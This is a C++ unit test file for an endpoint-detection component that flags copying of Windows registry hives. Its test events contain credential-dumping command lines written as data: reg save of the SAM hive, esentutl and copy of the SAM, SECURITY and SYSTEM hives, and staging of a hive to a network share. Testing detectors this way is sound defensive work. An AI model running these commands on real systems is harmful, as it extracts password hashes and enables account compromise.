/*
 * hive_copy_detector_tests.cpp - Unit tests for HiveCopyDetector.
 */
#include "hive_copy_detector_tests.h"

#include <windows.h>

#include <stdexcept>
#include <string>

#include "edr_event.h"
#include "event_bus.h"
#include "registry_hive_detector.h"

namespace {

#define HC_CHECK(condition) Check((condition), #condition, __LINE__)

void Check(bool condition, const char* expression, int line) {
    if (!condition)
        throw std::runtime_error(
            "hive copy detector test failed at line " +
            std::to_string(line) + ": " + expression);
}

edr::Event ProcEvent(uint64_t ts100ns, const char* image,
                     const char* commandLine) {
    edr::Event event;
    event.type = EDR_EVT_PROCESS_START;
    event.ts100ns = ts100ns;
    event.fields[edr::field::kType] = "PROCESS_START";
    event.fields[edr::field::kImage] = image;
    if (commandLine != nullptr)
        event.fields[edr::field::kCommandLine] = commandLine;
    return event;
}

edr::Event ScriptEvent(uint64_t ts100ns, const char* scriptBody) {
    edr::Event event;
    event.type = EDR_EVT_POWERSHELL_SCRIPT;
    event.ts100ns = ts100ns;
    event.fields[edr::field::kType] = "POWERSHELL_SCRIPT";
    event.fields[edr::field::kScriptBlockText] = scriptBody;
    return event;
}

std::string Score(const edr::Event& event) {
    auto it = event.fields.find(edr::field::kHiveCopyScore);
    return it == event.fields.end() ? "" : it->second;
}

constexpr uint64_t kSecond = 10000000ULL;

} // namespace

void RunHiveCopyDetectorTests() {
    std::fprintf(stderr, "[hive-copy] TestDisabled\n");
    {
        edr::HiveCopyDetector detector(false, 55, 300, 1024);
        edr::Event event = ProcEvent(
            1000 * kSecond,
            "C:\\Windows\\System32\\reg.exe",
            "reg save HKLM\\SAM C:\\Temp\\sam.hiv");
        detector.Enrich(event);
        HC_CHECK(Score(event).empty());
    }

    std::fprintf(stderr, "[hive-copy] TestRegSaveAndExport\n");
    {
        edr::HiveCopyDetector detector(true, 55, 300, 1024);
        edr::Event save = ProcEvent(
            1000 * kSecond,
            "C:\\Windows\\System32\\reg.exe",
            "reg save HKLM\\SAM C:\\Temp\\sam.hiv");
        detector.Enrich(save);
        HC_CHECK(Score(save) == "85");
        HC_CHECK(save.fields.at(edr::field::kHiveCopyVerdict) ==
                 "malicious");

        edr::Event exportCmd = ProcEvent(
            1010 * kSecond,
            "C:\\Windows\\System32\\reg.exe",
            "reg export HKLM\\SYSTEM C:\\Users\\Public\\system.reg");
        detector.Enrich(exportCmd);
        HC_CHECK(Score(exportCmd) == "75");
    }

    std::fprintf(stderr, "[hive-copy] TestEsentutlAndHiveFileCopy\n");
    {
        edr::HiveCopyDetector detector(true, 55, 300, 1024);
        edr::Event esent = ProcEvent(
            1000 * kSecond,
            "C:\\Windows\\System32\\esentutl.exe",
            "esentutl /y C:\\Windows\\System32\\config\\sam /d C:\\Temp\\sam.copy");
        detector.Enrich(esent);
        HC_CHECK(Score(esent) == "85");

        edr::Event copy = ProcEvent(
            1010 * kSecond,
            "C:\\Windows\\System32\\cmd.exe",
            "copy C:\\Windows\\System32\\config\\security C:\\Temp\\security.bak");
        detector.Enrich(copy);
        HC_CHECK(Score(copy) == "85");

        edr::Event staging = ProcEvent(
            1020 * kSecond,
            "C:\\Windows\\System32\\cmd.exe",
            "copy C:\\Windows\\System32\\config\\system \\\\10.0.0.5\\share\\system.hiv");
        detector.Enrich(staging);
        HC_CHECK(Score(staging) == "90");
    }

    std::fprintf(stderr, "[hive-copy] TestReadOnlyPathsSilent\n");
    {
        edr::HiveCopyDetector detector(true, 55, 300, 1024);
        edr::Event clean = ProcEvent(
            1000 * kSecond,
            "C:\\Windows\\System32\\cmd.exe",
            "dir C:\\Windows\\System32\\config\\sam");
        detector.Enrich(clean);
        HC_CHECK(Score(clean).empty());
        HC_CHECK(clean.fields.find(edr::field::kHiveCopyVerdict) ==
                 clean.fields.end());
    }

    std::fprintf(stderr, "[hive-copy] TestPowerShellCopy\n");
    {
        edr::HiveCopyDetector detector(true, 55, 300, 1024);
        edr::Event script = ScriptEvent(
            1000 * kSecond,
            "Copy-Item C:\\Windows\\System32\\config\\system C:\\Temp\\system.bak");
        detector.Enrich(script);
        HC_CHECK(Score(script) == "85");
    }

    std::fprintf(stderr, "[hive-copy] TestDedupWindow\n");
    {
        edr::HiveCopyDetector detector(true, 55, 60, 1024);
        const char* cmd = "reg save HKLM\\SAM C:\\Temp\\sam.hiv";
        edr::Event first = ProcEvent(1000 * kSecond,
                                     "C:\\Windows\\System32\\reg.exe",
                                     cmd);
        detector.Enrich(first);
        HC_CHECK(!Score(first).empty());

        edr::Event second = ProcEvent(1030 * kSecond,
                                      "C:\\Windows\\System32\\reg.exe",
                                      cmd);
        detector.Enrich(second);
        HC_CHECK(Score(second).empty());

        edr::Event third = ProcEvent(1100 * kSecond,
                                     "C:\\Windows\\System32\\reg.exe",
                                     cmd);
        detector.Enrich(third);
        HC_CHECK(!Score(third).empty());
    }

    std::fprintf(stderr, "[hive-copy] all passed\n");
}
